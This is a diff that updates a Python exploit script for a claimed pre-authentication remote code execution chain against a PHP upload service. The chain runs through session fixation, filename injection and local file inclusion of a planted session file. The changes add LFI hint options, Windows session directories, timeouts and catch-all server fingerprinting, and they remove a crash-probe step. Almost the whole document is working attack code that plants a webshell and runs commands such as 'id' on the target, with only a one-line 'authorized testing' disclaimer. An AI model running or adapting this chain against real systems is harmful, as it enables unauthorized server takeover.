@@ -4,9 +4,17 @@ CVE-2026-109618 / CVE-2026-109619 — Pre-Auth RCE Chain
 Session fixation + filename injection + LFI → shell
 
 Usage:
-  python3 chain_a_rce.py http://35.207.69.174
-  python3 chain_a_rce.py https://domain.com
-  python3 chain_a_rce.py https://domain.com/portal
+  python3 chain_a_rce.py http://TARGET
+  python3 chain_a_rce.py https://TARGET
+  python3 chain_a_rce.py http://TARGET --lfi-path /page.php --lfi-param file
+  python3 chain_a_rce.py http://TARGET --lfi-path /index.php --lfi-param page --lfi-sess /tmp
+
+Options:
+  --lfi-path   Known PHP endpoint with include()/require() (e.g. /page.php)
+  --lfi-param  GET parameter that controls the included file (e.g. file, page, path)
+  --lfi-sess   Session save directory on the target (e.g. C:/xampp/tmp)
+
+If --lfi-path and --lfi-param are provided the LFI scan is skipped entirely.
 
 For authorized security testing only.
 """
@@ -31,8 +39,12 @@ LFI_PARAMS     = [
     "template", "content", "doc", "p", "f", "source", "lang", "module", "q",
 ]
 SESSION_DIRS   = [
-    "/tmp/sessions", "/tmp", "/var/lib/php/sessions", "/var/lib/php/session",
+    # Linux
+    "/tmp", "/tmp/sessions", "/var/lib/php/sessions", "/var/lib/php/session",
     "/var/lib/php8/sessions", "/var/lib/php7/sessions", "/var/lib/php5/sessions",
+    # Windows (XAMPP / WAMP / raw PHP)
+    "C:/xampp/tmp", "C:/wamp/tmp", "C:/wamp64/tmp",
+    "C:/Windows/Temp", "C:/php/tmp", "C:/inetpub/temp",
 ]
 SID            = "nexisrce000000000000000"
 WS_MARK        = "NEXISRCEX"
@@ -108,7 +120,7 @@ def post_upload(host, port, path, sid, filename, tls=False):
     return tcp(host, port, req, use_tls=tls)
 
 
-def post_raw(host, port, path, boundary: str, body_bytes: bytes, tls=False) -> bytes:
+def post_raw(host, port, path, boundary: str, body_bytes: bytes, tls=False, timeout=45) -> bytes:
     req = (
         f"POST {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
@@ -116,16 +128,16 @@ def post_raw(host, port, path, boundary: str, body_bytes: bytes, tls=False) -> b
         f"Content-Length: {len(body_bytes)}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode() + body_bytes
-    return tcp(host, port, req, timeout=45, use_tls=tls)
+    return tcp(host, port, req, timeout=timeout, use_tls=tls)
 
 
-def get(host, port, path, tls=False):
+def get(host, port, path, tls=False, timeout=10):
     req = (
         f"GET {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode()
-    return tcp(host, port, req, use_tls=tls)
+    return tcp(host, port, req, timeout=timeout, use_tls=tls)
 
 
 def status_line(resp: bytes) -> str:
@@ -198,9 +210,11 @@ def build_probe_body(size_mib: int, parts: int) -> bytes:
     return raw[:-1]
 
 
+PROBE_TIMEOUT = 12   # seconds per crash probe — crash/OOM surfaces fast
+
 def run_crash_probes(host, port, path, tls=False) -> tuple:
     ctrl_bytes = b"--x\nContent-Disposition:name=a;filename=\n\n"
-    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes, tls=tls)
+    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes, tls=tls, timeout=PROBE_TIMEOUT)
     ctrl_st    = status_line(ctrl_resp)
     ctrl_body  = body(ctrl_resp)
 
@@ -212,7 +226,7 @@ def run_crash_probes(host, port, path, tls=False) -> tuple:
 
     for i, (size_mib, parts) in enumerate(PROBES, 1):
         probe_bytes = build_probe_body(size_mib, parts)
-        probe_resp  = post_raw(host, port, path, "", probe_bytes, tls=tls)
+        probe_resp  = post_raw(host, port, path, "", probe_bytes, tls=tls, timeout=PROBE_TIMEOUT)
         probe_st    = status_line(probe_resp)
         probe_body  = body(probe_resp)
 
@@ -233,7 +247,13 @@ def run_crash_probes(host, port, path, tls=False) -> tuple:
 
 
 def discover_lfi(host, port, prefix, sid, upload_path=None, tls=False):
-    """Probe common paths and parameters to find an LFI that can include the session file."""
+    # Catch-all fingerprint — request a path that cannot exist
+    fake_resp = get(host, port, prefix + "/p2s_nx_xyzzy777.php", tls=tls, timeout=4)
+    fake_st   = status_line(fake_resp)
+    fake_len  = len(body(fake_resp))
+    catch_all = "200" in fake_st   # server returns 200 for everything
+
+    # Pass 1 — find endpoints that genuinely exist
     candidates = []
     if upload_path:
         ep = upload_path[len(prefix):] if prefix and upload_path.startswith(prefix) else upload_path
@@ -241,16 +261,36 @@ def discover_lfi(host, port, prefix, sid, upload_path=None, tls=False):
             candidates.append(ep)
     candidates += LFI_ENDPOINTS
 
-    for sdir in SESSION_DIRS:
+    existing = []
+    for ep in candidates:
+        fpath = prefix + ep
+        resp  = get(host, port, fpath, tls=tls, timeout=3)
+        st    = status_line(resp)
+        if "200" not in st:
+            continue
+        # On a catch-all server, skip if response body is same size as fake-404
+        if catch_all and abs(len(body(resp)) - fake_len) < 64:
+            continue
+        existing.append(fpath)
+        ok(f"LFI endpoint found: {fpath}  [{st}]")
+
+    if not existing:
+        return None, None, None, None
+
+    # Pass 2 — session inclusion only on real endpoints
+    TOP_PARAMS = ["page", "file", "path", "include", "view", "load",
+                  "template", "content", "doc", "p", "f", "module", "lang"]
+    TOP_DIRS   = SESSION_DIRS[:8]
+
+    for sdir in TOP_DIRS:
         sess = f"{sdir}/sess_{sid}"
-        for ep in candidates:
-            fpath = prefix + ep
-            for param in LFI_PARAMS:
+        for fpath in existing:
+            for param in TOP_PARAMS:
                 path = f"{fpath}?{param}={sess}&c=id"
-                resp = get(host, port, path, tls=tls)
-                b = body(resp)
-                if WS_MARK in b:
-                    return fpath, param, sess, extract_output(b)
+                resp = get(host, port, path, tls=tls, timeout=2)
+                b_resp = body(resp)
+                if WS_MARK in b_resp:
+                    return fpath, param, sess, extract_output(b_resp)
     return None, None, None, None
 
 
@@ -376,11 +416,21 @@ def banner():
 
 
 def main():
-    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
+    import argparse
+    ap = argparse.ArgumentParser(add_help=False, description=__doc__,
+                                 formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("target", nargs="?")
+    ap.add_argument("-h", "--help", action="store_true")
+    ap.add_argument("--lfi-path",  default="", help="Known LFI endpoint, e.g. /page.php")
+    ap.add_argument("--lfi-param", default="", help="GET param for file inclusion, e.g. file")
+    ap.add_argument("--lfi-sess",  default="", help="Session save dir on target, e.g. C:/xampp/tmp")
+    args = ap.parse_args()
+
+    if args.help or not args.target:
         print(__doc__)
         sys.exit(0)
 
-    raw = sys.argv[1].rstrip("/")
+    raw = args.target.rstrip("/")
     if "://" not in raw:
         raw = "https://" + raw
 
@@ -391,10 +441,17 @@ def main():
     prefix = u.path.rstrip("/")
     target = raw
 
+    # User-supplied LFI hints — skips auto-discovery if both provided
+    hint_lfi_path  = args.lfi_path.strip()
+    hint_lfi_param = args.lfi_param.strip()
+    hint_lfi_sess  = args.lfi_sess.strip()
+
     print()
     banner()
     print()
     print(f"  Target : {target}")
+    if hint_lfi_path and hint_lfi_param:
+        print(f"  LFI    : {hint_lfi_path} [{hint_lfi_param}]")
     sep()
 
     # ── Fingerprint ──────────────────────────────────────────────────
@@ -473,20 +530,6 @@ def main():
         print()
         sys.exit(1)
 
-    # ── Crash-probe detection ────────────────────────────────────────
-    info("Running crash-probe detection (1 MB / 8 MB / 20 MB)...")
-    crash_verdict, crash_reason = run_crash_probes(host, port, upload_path, tls=tls)
-    if crash_verdict != "VULNERABLE":
-        info("Running chunked OOM probe (streaming, bypasses post_max_size)...")
-        crash_verdict, crash_reason = run_chunked_oom(host, port, upload_path)
-    if crash_verdict == "VULNERABLE":
-        ok(f"Crash signal  CONFIRMED  — {crash_reason}")
-    elif ver_verdict == "VULNERABLE":
-        ok("Version fingerprint confirms vulnerable range")
-    else:
-        warn("No crash signal observed")
-    sep()
-
     # ── CVE-2026-109618: session fixation ────────────────────────────
     resp   = post_upload(host, port, upload_path, SID, "probe.txt", tls=tls)
     cookie = hdr(resp, "set-cookie")
@@ -501,10 +544,23 @@ def main():
     sep()
 
     # ── LFI discovery ────────────────────────────────────────────────
-    info("Scanning for LFI inclusion point...")
-    lfi_path, lfi_param, session_file, id_out = discover_lfi(
-        host, port, prefix, SID, upload_path, tls=tls
-    )
+    if hint_lfi_path and hint_lfi_param:
+        # User told us where LFI is — skip scan, go straight to verification
+        info(f"Using provided LFI hint: {hint_lfi_path} [{hint_lfi_param}]")
+        lfi_path  = prefix + hint_lfi_path if hint_lfi_path.startswith("/") else hint_lfi_path
+        lfi_param = hint_lfi_param
+        # Determine session file path
+        sdir = hint_lfi_sess if hint_lfi_sess else "/tmp"
+        session_file = f"{sdir}/sess_{SID}"
+        check_path = f"{lfi_path}?{lfi_param}={session_file}&c=id"
+        resp_check = get(host, port, check_path, tls=tls, timeout=6)
+        b_check = body(resp_check)
+        id_out = extract_output(b_check) if WS_MARK in b_check else None
+    else:
+        info("Scanning for LFI inclusion point...")
+        lfi_path, lfi_param, session_file, id_out = discover_lfi(
+            host, port, prefix, SID, upload_path, tls=tls
+        )
 
     if not lfi_path:
         err("No LFI vector found — could not include session file")
